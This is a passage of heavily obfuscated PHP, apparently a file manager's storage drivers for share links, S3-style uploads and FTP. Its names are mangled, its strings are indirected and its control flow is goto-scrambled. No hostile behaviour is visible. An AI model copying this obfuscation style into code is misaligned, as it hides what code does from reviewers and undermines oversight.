$EÕ·Æ˜õ„ = IO::listAll($Fˆ½š®¸”Â); $fÈæ‚Óîƒ‹ = $this->pathParse[$eÛ¤ìÍŸÉ[475]]; foreach ($EÕ·Æ˜õ„ as &$EÖ—´Û¯ì) { check_abort(); $Fá·ÙÇù”• = IO::info($EÖ—´Û¯ì[$eÛ¤ìÍŸÉ[76]]); $Fá·ÙÇù”• = is_array($Fá·ÙÇù”•) ? $Fá·ÙÇù”• : array(); $EÖ—´Û¯ì = array_merge($Fá·ÙÇù”•, $EÖ—´Û¯ì); $EÖ—´Û¯ì[$eÛ¤ìÍŸÉ[85]] = Action($eÛ¤ìÍŸÉ[1221])->_shareItemeParse($EÖ—´Û¯ì, $fÈæ‚Óîƒ‹); } unset($EÖ—´Û¯ì); return $EÕ·Æ˜õ„; } public function getPathOuter($DˆÙ¯‡ß®) { goto dÙ†õÃ‹ƒ‡; AÄªãæèíŸ: if (substr($dÔùÌí±‡, 0, strlen($DõÔœšî)) != $DõÔœšî) { return !1; } return $this->pathParse[$CÓÜîåÙÌĞ[1073]] . $CÓÜîåÙÌĞ[8] . ltrim($cÉ£ìÀãÔ, $CÓÜîåÙÌĞ[8]); goto CÂƒÕ–ñ“; dÙ†õÃ‹ƒ‡: $CÓÜîåÙÌĞ =& $_SERVER[úÉ·öƒÑì©]; $c÷øè‘º“ = KodIO::parse($DˆÙ¯‡ß®); if ($c÷øè‘º“[$CÓÜîåÙÌĞ[29]] == KodIO::KOD_SHARE_ITEM) { return $c÷øè‘º“[$CÓÜîåÙÌĞ[76]]; } goto D®¢Ï÷’â¬; D®¢Ï÷’â¬: $dÔùÌí±‡ = KodIO::clear($DˆÙ¯‡ß®); $DõÔœšî = KodIO::clear($this->pathParse[$CÓÜîåÙÌĞ[475]][$CÓÜîåÙÌĞ[1079]]); $cÉ£ìÀãÔ = substr($dÔùÌí±‡, strlen($DõÔœšî)); goto AÄªãæèíŸ; CÂƒÕ–ñ“: } public function getType() { $EËÑ²‚ßÔ– =& $_SERVER[úÉ·öƒÑì©]; $f±ò…¡«Ğ = str_replace($EËÑ²‚ßÔ–[72], $EËÑ²‚ßÔ–[33], get_class($this)); return strtolower($f±ò…¡«Ğ); } public function isTypeObject($E†Ü’Ùæèí) { return IO::isTypeObject($E†Ü’Ùæèí); } public function info($dî–‚­¤ª) { return $this->infoParse($dî–‚­¤ª); } public function infoAuth($F„·´Ììêª) { return $this->infoParse($F„·´Ììêª); } public function infoWithChildren($Dàêˆ½£Ğ) { return $this->infoParse($Dàêˆ½£Ğ, !0); } public function infoFull($a‘ĞòÎ¨¸Ê) { return $this->infoParse($a‘ĞòÎ¨¸Ê); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($A•¢›•°÷ª) { $this->pathParse = $A•¢›•°÷ª; } protected function infoParse($bîò¯Ç±, $BÎª«×Â‘ = false) { $BÔİ‹®á =& $_SERVER[úÉ·öƒÑì©]; return Action($BÔİ‹®á[1078])->sharePathInfo($this->pathParse[$BÔİ‹®á[76]], !0, $BÎª«×Â‘); } public function listPath($aÑ ®œÀ²Ü, $F­íëîÇçÈ = false) { $Fó£—ªÕ¦ =& $_SERVER[úÉ·öƒÑì©]; $C·ÄÙˆÎ±Ş = IO::listPath($aÑ ®œÀ²Ü, $F­íëîÇçÈ); foreach ($C·ÄÙˆÎ±Ş as $B¢Ø‰³ÕÀ¢ => $e­ëÉµÏ) { if (!in_array($B¢Ø‰³ÕÀ¢, array($Fó£—ªÕ¦[74], $Fó£—ªÕ¦[75]))) { continue; } foreach ($e­ëÉµÏ as $EÌŞÅ²±ö => $eˆø–óÑÕî) { $eˆø–óÑÕî = Action($Fó£—ªÕ¦[1230])->parsePathChildren($eˆø–óÑÕî, array($Fó£—ªÕ¦[423] => $aÑ ®œÀ²Ü)); $C·ÄÙˆÎ±Ş[$B¢Ø‰³ÕÀ¢][$EÌŞÅ²±ö] = Action($Fó£—ªÕ¦[1078])->shareItemInfo($eˆø–óÑÕî); } } return $C·ÄÙˆÎ±Ş; } public function listAll($f”Ş…‚¡Ÿ) { $d‰ÃêÚµ‹š =& $_SERVER[úÉ·öƒÑì©]; $EºÈ´ë¸’ï = IO::listAll($f”Ş…‚¡Ÿ); foreach ($EºÈ´ë¸’ï as &$fç—ã¹´«İ) { $d—¦¼äé—Æ = IO::info($fç—ã¹´«İ[$d‰ÃêÚµ‹š[76]]); $d—¦¼äé—Æ = is_array($d—¦¼äé—Æ) ? $d—¦¼äé—Æ : array(); $fç—ã¹´«İ = array_merge($d—¦¼äé—Æ, $fç—ã¹´«İ); $fç—ã¹´«İ[$d‰ÃêÚµ‹š[85]] = Action($d‰ÃêÚµ‹š[1078])->shareItemInfo($fç—ã¹´«İ); } unset($fç—ã¹´«İ); return $EºÈ´ë¸’ï; } } goto C„ò‹ÛŞŒİ; C„ò‹ÛŞŒİ: class PathDriverEDS extends PathDriverMinIO { public function __construct($d¾Â˜“æÂ) { parent::__construct($d¾Â˜“æÂ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($d‹­¹‹ÜñŒ) { parent::__construct($d‹­¹‹ÜñŒ); $this->signatureVersion($_SERVER[úÉ·öƒÑì©][212]); } public function uploadFormData($f×ÚíÚ†Ê, $E‚„áŸ®¥© = 3600) { goto DæñßÈÖ‡ö; DæñßÈÖ‡ö: $C•àëÛùäÇ =& $_SERVER[úÉ·öƒÑì©]; $C¤ŠÙãÊ” = $C•àëÛùäÇ[192]; $b¦‰Ã‘ÅŞ« = $C•àëÛùäÇ[1231]; goto f†èô®Üª”; bƒìŸíª÷š: $Eæ‚½’ªô¸ = hash_hmac($C•àëÛùäÇ[1241], $CÅ˜ˆøêéŠ, $F½¹µ…÷¡±, !0); $cÌ…¹¬„¤’ = hash_hmac($C•àëÛùäÇ[1241], $bÅÛñŸĞŒê, $Eæ‚½’ªô¸, !0); $aœò‘åˆ° = hash_hmac($C•àëÛùäÇ[1241], $b­ÀÌˆŞß©, $cÌ…¹¬„¤’); goto bâîã¥ÖÆì; f†èô®Üª”: $CÅ˜ˆøêéŠ = $C•àëÛùäÇ[59]; $f˜íå·àöŠ = gmdate($C•àëÛùäÇ[1232]); $CĞ¦ª•ë‡… = gmdate($C•àëÛùäÇ[727]); goto AË‘§×«ˆ³; bâîã¥ÖÆì: $EˆÀ‚Ø¿ºá = array($C•àëÛùäÇ[211] => $C•àëÛùäÇ[33], $C•àëÛùäÇ[1243] => $C•àëÛùäÇ[33], $C•àëÛùäÇ[1200] => $C¤ŠÙãÊ”, $C•àëÛùäÇ[1204] => $CÈº£¨¬Àï, $C•àëÛùäÇ[1208] => $b­ÀÌˆŞß©, $C•àëÛùäÇ[1244] => $Eµ‚‘²„ÌÙ, $C•àëÛùäÇ[1245] => $b¦‰Ã‘ÅŞ«, $C•àëÛùäÇ[1246] => $f˜íå·àöŠ, $C•àëÛùäÇ[1247] => $b†ŠİÛßø, $C•àëÛùäÇ[1248] => $aœò‘åˆ°, $C•àëÛùäÇ[175] => $this->getHost()); return $EˆÀ‚Ø¿ºá; goto E¡Ó­Óå; a†ğ‘™Æ÷³: $b­ÀÌˆŞß© = base64_encode(json_encode($bº¯æİ¦­‹)); $B…ó…¼ç«‘ = hash_hmac($C•àëÛùäÇ[1241], $CĞ¦ª•ë‡…, $C•àëÛùäÇ[1242] . $this->secret, !0); $F½¹µ…÷¡± = hash_hmac($C•àëÛùäÇ[1241], $this->region, $B…ó…¼ç«‘, !0); goto bƒìŸíª÷š; AË‘§×«ˆ³: $bÅÛñŸĞŒê = $C•àëÛùäÇ[1233]; $b†ŠİÛßø = $E‚„áŸ®¥© . $C•àëÛùäÇ[33]; $CÈº£¨¬Àï = $C•àëÛùäÇ[1196]; goto B²¦ÂÚÑÆ; B²¦ÂÚÑÆ: $e„›«ÁêÄ× = array($this->accessKey, $CĞ¦ª•ë‡…, $this->region, $CÅ˜ˆøêéŠ, $bÅÛñŸĞŒê); $Eµ‚‘²„ÌÙ = implode($C•àëÛùäÇ[8], $e„›«ÁêÄ×); $bº¯æİ¦­‹ = array($C•àëÛùäÇ[1198] => gmdate($C•àëÛùäÇ[1197], strtotime($C•àëÛùäÇ[1234])), $C•àëÛùäÇ[1199] => array(array($C•àëÛùäÇ[1201] => $this->bucket), array($C•àëÛùäÇ[1200] => $C¤ŠÙãÊ”), array($C•àëÛùäÇ[1202], $C•àëÛùäÇ[1203], $C•àëÛùäÇ[33]), array($C•àëÛùäÇ[1202], $C•àëÛùäÇ[1235], $C•àëÛùäÇ[33]), array($C•àëÛùäÇ[1202], $C•àëÛùäÇ[1236], $C•àëÛùäÇ[33]), array($C•àëÛùäÇ[1204] => $CÈº£¨¬Àï), array($C•àëÛùäÇ[1237] => $Eµ‚‘²„ÌÙ), array($C•àëÛùäÇ[1238] => $b¦‰Ã‘ÅŞ«), array($C•àëÛùäÇ[1239] => $f˜íå·àöŠ), array($C•àëÛùäÇ[1240] => $b†ŠİÛßø))); goto a†ğ‘™Æ÷³; E¡Ó­Óå: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($a„¦š†§¡à) { parent::__construct(); if (count($a„¦š†§¡à) > 0) { $this->_init($a„¦š†§¡à); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($E®òŠ¡šà›) { $Aàì‹Ê³´¹ =& $_SERVER[úÉ·öƒÑì©]; global $config; $this->appCharset = $config[$Aàì‹Ê³´¹[1249]]; $this->systemCharset = $config[$Aàì‹Ê³´¹[1250]]; if (isset($E®òŠ¡šà›[$Aàì‹Ê³´¹[1251]]) && $E®òŠ¡šà›[$Aàì‹Ê³´¹[1251]]) { $this->systemCharset = $E®òŠ¡šà›[$Aàì‹Ê³´¹[1251]]; } } public function iconvApp($fŞêÂ‰¬) { return $this->iconvTo($fŞêÂ‰¬, $this->systemCharset, $this->appCharset); } public function iconvSystem($AÈˆáøŒî») { return $this->iconvTo($AÈˆáøŒî», $this->appCharset, $this->systemCharset); } public function getPathOuter($EôË®îÒ‘) { goto d†ÍåßÒ°Æ; f½’”‰‹õ: return $this->pathDriver . $aì¦Ñ—ëƒ¿[8] . ltrim($EôË®îÒ‘, $aì¦Ñ—ëƒ¿[8]); goto E×¼ñƒŒ„µ; Eò°ˆŠ¦ò‡: if (substr($f¯ˆ¯Ğùµê, 0, 2) == $aì¦Ñ—ëƒ¿[1252]) { $f¯ˆ¯Ğùµê = BASIC_PATH . substr($f¯ˆ¯Ğùµê, 2); } if (substr($EôË®îÒ‘, 0, 2) == $aì¦Ñ—ëƒ¿[1252]) { $EôË®îÒ‘ = BASIC_PATH . substr($EôË®îÒ‘, 2); } $f¯ˆ¯Ğùµê = KodIO::clear($f¯ˆ¯Ğùµê); goto BöÑ´¶¸æÅ; BöÑ´¶¸æÅ: $EôË®îÒ‘ = KodIO::clear($EôË®îÒ‘); $EôË®îÒ‘ = substr($EôË®îÒ‘, strlen($f¯ˆ¯Ğùµê)); if (empty($this->pathDriver)) { return $EôË®îÒ‘; } goto f½’”‰‹õ; d†ÍåßÒ°Æ: $aì¦Ñ—ëƒ¿ =& $_SERVER[úÉ·öƒÑì©]; $f¯ˆ¯Ğùµê = $this->iconvApp($this->pathBase); $EôË®îÒ‘ = $this->iconvApp($EôË®îÒ‘); goto Eò°ˆŠ¦ò‡; E×¼ñƒŒ„µ: } private function _init($CñØ¢™çí¬ = array()) { $C„š¼•–ÄŠ =& $_SERVER[úÉ·öƒÑì©]; if (!function_exists($C„š¼•–ÄŠ[1253])) { throw new Exception(LNG($C„š¼•–ÄŠ[1254])); } $this->config = $CñØ¢™çí¬; $this->charsetReset($CñØ¢™çí¬); foreach ($CñØ¢™çí¬ as $d·İ’”¼©¹ => $fÄ™¬îù«²) { if (isset($this->{$d·İ’”¼©¹})) { $this->{$d·İ’”¼©¹} = $fÄ™¬îù«²; } } return $this->_login($CñØ¢™çí¬); } private function _login($FÊ­ÎäÅ) { goto Bµ¿Êéæ÷; Cëˆ‘‹¹§µ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $D½âÆ¢äÉ  = @ftp_login($this->connect, $this->username, $this->userpass); goto eñã ùòß; dåµŞ¡‡»Î: $A±¡£©åïó[$e‡‡‹‚ƒÙÉ] = array($AÔ÷·™šç[1258] => $this->connect, $AÔ÷·™šç[175] => $this->host, $AÔ÷·™šç[174] => $this->scheme, $AÔ÷·™šç[176] => $this->port); return $D½âÆ¢äÉ ; goto C•Ô·Úéİ; Bµ¿Êéæ÷: $AÔ÷·™šç =& $_SERVER[úÉ·öƒÑì©]; static $A±¡£©åïó = array(); $e‡‡‹‚ƒÙÉ = md5(json_encode($FÊ­ÎäÅ)); goto cËÃÁ²±‡Ù; bÑÉ¹®¼„¦: $C›¦·ğ›Ù = isset($bƒ­»¾êİ [$AÔ÷·™šç[174]]) && $bƒ­»¾êİ [$AÔ÷·™šç[174]] == $AÔ÷·™šç[1255] ? !0 : !1; $this->scheme = $C›¦·ğ›Ù ? $AÔ÷·™šç[1256] : $AÔ÷·™šç[1257]; $this->port = isset($bƒ­»¾êİ [$AÔ÷·™šç[176]]) ? $bƒ­»¾êİ [$AÔ÷·™šç[176]] : 21; goto Cëˆ‘‹¹§µ; cËÃÁ²±‡Ù: if (isset($A±¡£©åïó[$e‡‡‹‚ƒÙÉ])) { foreach ($A±¡£©åïó[$e‡‡‹‚ƒÙÉ] as $EÑÂò§Ü => $D¬ÌƒñéÁ–) { $this->{$EÑÂò§Ü} = $D¬ÌƒñéÁ–; } return !0; } $bƒ­»¾êİ  = parse_url(trim($this->server, $AÔ÷·™šç[8])); $this->host = $bƒ­»¾êİ [$AÔ÷·™šç[175]]; goto bÑÉ¹®¼„¦; eñã ùòß: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $dÔœå’”À† = $this->pasv == $AÔ÷·™šç[87] ? !0 : !1; @ftp_pasv($this->connect, $dÔœå’”À†); goto dåµŞ¡‡»Î; C•Ô·Úéİ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($e‡ôÀÆ•ò‹, $d¶²©çæ÷— = '', $F¯¹ó†§•× = REPEAT_RENAME) { if ($this->setContent($e‡ôÀÆ•ò‹, $d¶²©çæ÷—)) { return $this->getPathOuter($e‡ôÀÆ•ò‹); } return !1; } public function mkdir($eóš‰˜Û¸é, $Dë¼„‡ƒÂ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $eóš‰˜Û¸é = $this->iconvSystem($eóš‰˜Û¸é); if ($this->_isFolder($eóš‰˜Û¸é) || @ftp_mkdir($this->connect, $eóš‰˜Û¸é)) { return $this->getPathOuter($eóš‰˜Û¸é); } if (!$this->mkdir($this->pathFather($eóš‰˜Û¸é))) { return !1; } if ($eóš‰˜Û¸é = @ftp_mkdir($this->connect, $eóš‰˜Û¸é)) { return $this->getPathOuter($eóš‰˜Û¸é); } return !1; } public function copyFile($bÚñ‡³‹ñÛ, $AÄìù÷Ô…) { goto dÓ®ˆ‘Ü¾¹; c÷ªÄÓ¢Êê: $eìÑ‚ó‡¬ = $this->iconvApp($AĞ¤è˜í¨­); $this->download($bÚñ‡³‹ñÛ, $eìÑ‚ó‡¬); $AØ¯å‹ ˜ = $this->upload($AÄìù÷Ô…, $eìÑ‚ó‡¬); goto bŠ‹®µêÌ; dÓ®ˆ‘Ü¾¹: if (!$this->_isconn()) { return !1; } $DÛ³´†®º = $this->pathThis($this->iconvSystem($bÚñ‡³‹ñÛ)); $AĞ¤è˜í¨­ = $this->tempFile($DÛ³´†®º); goto c÷ªÄÓ¢Êê; bŠ‹®µêÌ: $this->tempFileRemve($AĞ¤è˜í¨­); return $AØ¯å‹ ˜; goto E«†ÅÀ¯ã­; E«†ÅÀ¯ã­: } public function moveFile($a¡«ëñ—„, $E¥ñ‘÷¢óè) { if (!$this->_isconn()) { return !1; } $a¡«ëñ—„ = $this->iconvSystem($a¡«ëñ—„); $E¥ñ‘÷¢óè = $this->iconvSystem($E¥ñ‘÷¢óè); $Fä‚ë‹Ôá® = @ftp_rename($this->connect, $a¡«ëñ—„, $E¥ñ‘÷¢óè); return $Fä‚ë‹Ôá® ? $this->getPathOuter($E¥ñ‘÷¢óè) : !1; } public function delFile($f¤ó›Œ«Æƒ) { if (!$this->_isconn()) { return !1; } $f¤ó›Œ«Æƒ = $this->iconvSystem($f¤ó›Œ«Æƒ); return @ftp_delete($this->connect, $f¤ó›Œ«Æƒ); } public function delFolder($cÚ„ö‘çÔØ) { goto C½í¬Ã´¹†; C½í¬Ã´¹†: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Aå©Ş£œ‘ë = $aÆõæĞƒ” = array(); goto FÅŠ¬’ã„Ê; FÅŠ¬’ã„Ê: $this->fileList($cÚ„ö‘çÔØ, $Aå©Ş£œ‘ë, $aÆõæĞƒ”, !0); $this->listItemCache = !0; foreach ($aÆõæĞƒ” as $Dø¸‘³¼¹°) { $d°Ÿ„ª°ê = $this->iconvSystem($Dø¸‘³¼¹°[$_SERVER[úÉ·öƒÑì©][28]]); $DáŠ½Ñ·· = @ftp_delete($this->connect, $d°Ÿ„ª°ê); if (!$DáŠ½Ñ··) { return !1; } } goto C²Ù„õ ; C²Ù„õ : foreach ($Aå©Ş£œ‘ë as $d°Ÿ„ª°ê) { $d°Ÿ„ª°ê = $this->iconvSystem($d°Ÿ„ª°ê); $DáŠ½Ñ·· = @ftp_rmdir($this->connect, $d°Ÿ„ª°ê); if (!$DáŠ½Ñ··) { return !1; } } $cÚ„ö‘çÔØ = $this->iconvSystem($cÚ„ö‘çÔØ); return @ftp_rmdir($this->connect, $cÚ„ö‘çÔØ); goto e‡ÅÑİßé§; e‡ÅÑİßé§: } public function rename($fª°ÍËÙ¦, $Dö»‰‘É‰²) { goto AÜÂ²ò†òİ; FàŒ¬½™Ç¥: $dó‚ê˜‡ğ« = rtrim($F«¼ä¿·èŒ, $F«öÜ÷œ[8]) . $F«öÜ÷œ[8] . $FîÓİ×¾Ô§; $FùĞ’ÜˆÃ = @ftp_rename($this->connect, $fª°ÍËÙ¦, $dó‚ê˜‡ğ«); $dó‚ê˜‡ğ« = $this->iconvApp($dó‚ê˜‡ğ«); goto bŒŒùª· Ï; bŒŒùª· Ï: return $FùĞ’ÜˆÃ ? $this->getPathOuter($dó‚ê˜‡ğ«) : !1; goto Cê ¤Â³™»; AÜÂ²ò†òİ: $F«öÜ÷œ =& $_SERVER[úÉ·öƒÑì©]; if (!$this->_isconn()) { return !1; } $FîÓİ×¾Ô§ = $this->fileNameAuto($this->pathFather($fª°ÍËÙ¦), $Dö»‰‘É‰²); goto F’¾®Á„; F’¾®Á„: $FîÓİ×¾Ô§ = $this->iconvSystem($FîÓİ×¾Ô§); $fª°ÍËÙ¦ = $this->iconvSystem($fª°ÍËÙ¦); $F«¼ä¿·èŒ = $this->pathFather($fª°ÍËÙ¦); goto FàŒ¬½™Ç¥; Cê ¤Â³™»: } private function folderInfo($d±¡‚¥ÅÆŠ, $a³³¸Ç§¶ = false) { $eÙ¸ŞÇªÛ² =& $_SERVER[úÉ·öƒÑì©]; $D“Âœ¿˜Êƒ = array($eÙ¸ŞÇªÛ²[28] => $this->pathThis($d±¡‚¥ÅÆŠ), $eÙ¸ŞÇªÛ²[76] => $this->getPathOuter($eÙ¸ŞÇªÛ²[8] . $d±¡‚¥ÅÆŠ), $eÙ¸ŞÇªÛ²[29] => $eÙ¸ŞÇªÛ²[77]); if ($a³³¸Ç§¶) { return $D“Âœ¿˜Êƒ; } $D“Âœ¿˜Êƒ[$eÙ¸ŞÇªÛ²[194]] = $D“Âœ¿˜Êƒ[$eÙ¸ŞÇªÛ²[84]] = 0; $D“Âœ¿˜Êƒ[$eÙ¸ŞÇªÛ²[195]] = $D“Âœ¿˜Êƒ[$eÙ¸ŞÇªÛ²[196]] = !0; return $D“Âœ¿˜Êƒ; } private function fileInfo($dàÑâÑ¯ùÏ, $FÈ½×ìÓÄö = false, $EÅÜáßà†ˆ = array()) { goto eì¶—‚¯Ä±; eì¶—‚¯Ä±: $FŒ¿ªà Ôµ =& $_SERVER[úÉ·öƒÑì©]; $e—ÂÁÚÔô± = array($FŒ¿ªà Ôµ[28] => $this->pathThis($dàÑâÑ¯ùÏ), $FŒ¿ªà Ôµ[76] => $this->getPathOuter($FŒ¿ªà Ôµ[8] . $dàÑâÑ¯ùÏ), $FŒ¿ªà Ôµ[29] => $FŒ¿ªà Ôµ[193], $FŒ¿ªà Ôµ[78] => isset($EÅÜáßà†ˆ[$FŒ¿ªà Ôµ[78]]) ? $EÅÜáßà†ˆ[$FŒ¿ªà Ôµ[78]] : 0, $FŒ¿ªà Ôµ[168] => $this->ext($dàÑâÑ¯ùÏ)); if ($FÈ½×ìÓÄö) { return $e—ÂÁÚÔô±; } goto AË§íÆ©ä…; AË§íÆ©ä…: $e—ÂÁÚÔô±[$FŒ¿ªà Ôµ[194]] = $e—ÂÁÚÔô±[$FŒ¿ªà Ôµ[84]] = 0; $e—ÂÁÚÔô±[$FŒ¿ªà Ôµ[195]] = $e—ÂÁÚÔô±[$FŒ¿ªà Ôµ[196]] = !0; $fÀ½ëåç Ç = $this->iconvSystem($dàÑâÑ¯ùÏ); goto dÛ¤é‘Åöù; eŠÇ¥ÖÀÆ±: return $e—ÂÁÚÔô±; goto fò›á÷ÈŒ; dÛ¤é‘Åöù: $e—ÂÁÚÔô±[$FŒ¿ªà Ôµ[84]] = @ftp_mdtm($this->connect, $fÀ½ëåç Ç); if (empty($EÅÜáßà†ˆ)) { $EÅÜáßà†ˆ = $this->objectMeta($dàÑâÑ¯ùÏ); if (!$EÅÜáßà†ˆ) { return $e—ÂÁÚÔô±; } } $e—ÂÁÚÔô±[$FŒ¿ªà Ôµ[78]] = $EÅÜáßà†ˆ[$FŒ¿ªà Ôµ[78]]; goto eŠÇ¥ÖÀÆ±; fò›á÷ÈŒ: } public function size($aÑƒ¥ÓÛòÆ) { $DœÀ³ã†ó— = $this->objectMeta($aÑƒ¥ÓÛòÆ); return $DœÀ³ã†ó— ? $DœÀ³ã†ó—[$_SERVER[úÉ·öƒÑì©][78]] : 0; } public function info($f²¿ÂÉ’Ìù) { if ($this->isFile($f²¿ÂÉ’Ìù)) { return $this->fileInfo($f²¿ÂÉ’Ìù, 0); } else { if ($this->isFolder($f²¿ÂÉ’Ìù)) { return $this->folderInfo($f²¿ÂÉ’Ìù); } } return !1; } private function fileList($DŸ‡Ñ¤ÁÈœ, &$AÂÛ¤íŠÑ†, &$C©Á£øÛÑ´, $C‚ÙÕÏ¥‚ó = false) { goto bŠæÓëˆâ; bÁèóÒ–å»: $fÕƒäîŸÆ = array($F˜²ª•·óê[95] => 1, $F˜²ª•·óê[1259] => 1); foreach ($bã„Ş½ªÀ as $A„ºÜ’¥È·) { goto DõÊ¶½”²Ñ; BøÃİêè²: if (substr($A„ºÜ’¥È·, 0, 1) == $F˜²ª•·óê[1260]) { $b°·©±çŸß[$F˜²ª•·óê[29]] = $F˜²ª•·óê[77]; $b°·©±çŸß[$F˜²ª•·óê[78]] = 0; } $D¬½®×‹·¹ = $b°·©±çŸß[$F˜²ª•·óê[29]] == $F˜²ª•·óê[77] ? !0 : !1; if ($D…ñšËµß„) { $this->cacheMethod($F˜²ª•·óê[199], $b•ï·Ä¿¼Ï, $D¬½®×‹·¹); $this->cacheMethod($F˜²ª•·óê[200], $b•ï·Ä¿¼Ï, $b°·©±çŸß); } goto C¤”ÀÌÜÑÙ; DõÊ¶½”²Ñ: $a”Ã•„ï¢ñ = $this->_listItem($A„ºÜ’¥È·); if ($a”Ã•„ï¢ñ[0] == $F˜²ª•·óê[735]) { continue; } $b•ï·Ä¿¼Ï = $a”Ã•„ï¢ñ[8]; goto d •Ò¥êŠª; C¤”ÀÌÜÑÙ: if ($D¬½®×‹·¹) { $AÂÛ¤íŠÑ†[] = $b•ï·Ä¿¼Ï; if ($C‚ÙÕÏ¥‚ó) { $this->fileList($b•ï·Ä¿¼Ï, $AÂÛ¤íŠÑ†, $C©Á£øÛÑ´, $C‚ÙÕÏ¥‚ó); } continue; } $C©Á£øÛÑ´[] = $b°·©±çŸß; goto A©À‡¤Œ; d •Ò¥êŠª: if (empty($b•ï·Ä¿¼Ï) && $b•ï·Ä¿¼Ï !== $F˜²ª•·óê[191] || isset($fÕƒäîŸÆ[$b•ï·Ä¿¼Ï])) { continue; } $b•ï·Ä¿¼Ï = $this->iconvApp($DŸ‡Ñ¤ÁÈœ . ltrim($b•ï·Ä¿¼Ï, $F˜²ª•·óê[8])); $b°·©±çŸß = array($F˜²ª•·óê[28] => $b•ï·Ä¿¼Ï, $F˜²ª•·óê[29] => $F˜²ª•·óê[193], $F˜²ª•·óê[78] => $a”Ã•„ï¢ñ[4]); goto BøÃİêè²; A©À‡¤Œ: } if ($D…ñšËµß„) { $this->cacheMethod($F˜²ª•·óê[199], $DŸ‡Ñ¤ÁÈœ, !0); } goto a¤®õ‚ƒÛ›; b¼§éœÉ›«: @ftp_chdir($this->connect, $F˜²ª•·óê[8]); $DŸ‡Ñ¤ÁÈœ = rtrim($DŸ‡Ñ¤ÁÈœ, $F˜²ª•·óê[8]) . $F˜²ª•·óê[8]; check_abort(); goto dËİ¤‰ÖŠ; dËİ¤‰ÖŠ: $D…ñšËµß„ = $this->listItemCache === !1 ? !1 : !0; $bã„Ş½ªÀ = @ftp_rawlist($this->connect, $DŸ‡Ñ¤ÁÈœ); if (!$bã„Ş½ªÀ) { $bã„Ş½ªÀ = array(); } goto bÁèóÒ–å»; bŠæÓëˆâ: $F˜²ª•·óê =& $_SERVER[úÉ·öƒÑì©]; $DŸ‡Ñ¤ÁÈœ = $this->iconvSystem($DŸ‡Ñ¤ÁÈœ); if (!$this->isFolder($DŸ‡Ñ¤ÁÈœ)) { return !1; } goto b¼§éœÉ›«; a¤®õ‚ƒÛ›: } private function _listItem($AÜÕ×ßºæ§) { if (empty($AÜÕ×ßºæ§)) { return array(); } $a–ãÆŒŸ×ê = preg_split($_SERVER[úÉ·öƒÑì©][1261], $AÜÕ×ßºæ§); if (count($a–ãÆŒŸ×ê) <= 9) { return $a–ãÆŒŸ×ê; } $a–ãÆŒŸ×ê[8] = trim(substr($AÜÕ×ßºæ§, strpos($AÜÕ×ßºæ§, $a–ãÆŒŸ×ê[7]) + strlen($a–ãÆŒŸ×ê[7]))); return array_splice($a–ãÆŒŸ×ê, 0, 9); } public function listPath($Eé‚ÈµƒÒ, $c§Òº¦¥«¶ = false) { goto bƒ®¸Î¡¡; C÷Ğ™õßŸŠ: $this->fileList($Eé‚ÈµƒÒ, $eÎªõªÙÒê, $FÆíÖ†); foreach ($eÎªõªÙÒê as $e®°í‰ÃñÌ => $aíÇÄß‰Œ) { $eÎªõªÙÒê[$e®°í‰ÃñÌ] = $this->folderInfo($aíÇÄß‰Œ, $c§Òº¦¥«¶); } foreach ($FÆíÖ† as $e®°í‰ÃñÌ => $aíÇÄß‰Œ) { $FÆíÖ†[$e®°í‰ÃñÌ] = $this->fileInfo($aíÇÄß‰Œ[$bïä„ø÷òò[28]], $c§Òº¦¥«¶, $aíÇÄß‰Œ); } goto bĞÚ×‚œ®Ÿ; bĞÚ×‚œ®Ÿ: return array($bïä„ø÷òò[75] => $eÎªõªÙÒê, $bïä„ø÷òò[74] => $FÆíÖ†); goto F°Ğù„; bƒ®¸Î¡¡: $bïä„ø÷òò =& $_SERVER[úÉ·öƒÑì©]; if (!$this->_isconn()) { return !1; } $eÎªõªÙÒê = $FÆíÖ† = array(); goto C÷Ğ™õßŸŠ; F°Ğù„: } public function has($eÒÉµ»âè, $D«¥ÓôšğÕ = false, $C¿ù‘›¸Ø‘ = true) { goto E©›ÀÔôÈ„; AƒÒ¡»îê: $this->fileList($eÒÉµ»âè, $dÙ„Ö™äáï, $b¤ã«ğÔ», $Eïø„±ğÚš); if ($D«¥ÓôšğÕ) { return array($aÀ‘›ÊŞŸÑ[203] => count($b¤ã«ğÔ»), $aÀ‘›ÊŞŸÑ[204] => count($dÙ„Ö™äáï)); } if ($C¿ù‘›¸Ø‘) { if (count($b¤ã«ğÔ»)) { return !0; } } else { if (count($dÙ„Ö™äáï)) { return !0; } } goto fèùÛä••‹; fèùÛä••‹: return !1; goto Aêè‘Õ˜Éò; E©›ÀÔôÈ„: $aÀ‘›ÊŞŸÑ =& $_SERVER[úÉ·öƒÑì©]; $dÙ„Ö™äáï = $b¤ã«ğÔ» = array(); $Eïø„±ğÚš = $D«¥ÓôšğÕ ? !0 : !1; goto AƒÒ¡»îê; Aêè‘Õ˜Éò: } public function listAll($FÓ”ñ”ÕŞ) { goto C§×ø•ƒ¥; eÇñ¯…¬àõ: foreach ($a¯ÏÎ¬ÄêÓ as $e¿Èß¥æÌ) { if (is_string($e¿Èß¥æÌ)) { $f¬‚­›³‘ò[$e¿Èß¥æÌ] = 0; } } return $this->listAllFiles($FÓ”ñ”ÕŞ, array_keys($f¬‚­›³‘ò), $f¬‚­›³‘ò); goto A¬›êˆ›¤; d«±†Ú£: $this->fileList($FÓ”ñ”ÕŞ, $a¯ÏÎ¬ÄêÓ, $f¨ƒÈ¨­÷Ğ, !0); $f¬‚­›³‘ò = array(); foreach ($f¨ƒÈ¨­÷Ğ as $e¿Èß¥æÌ) { $f¬‚­›³‘ò[$e¿Èß¥æÌ[$cæŞğ°ÏÑ[28]]] = $e¿Èß¥æÌ[$cæŞğ°ÏÑ[78]]; } goto eÇñ¯…¬àõ; C§×ø•ƒ¥: $cæŞğ°ÏÑ =& 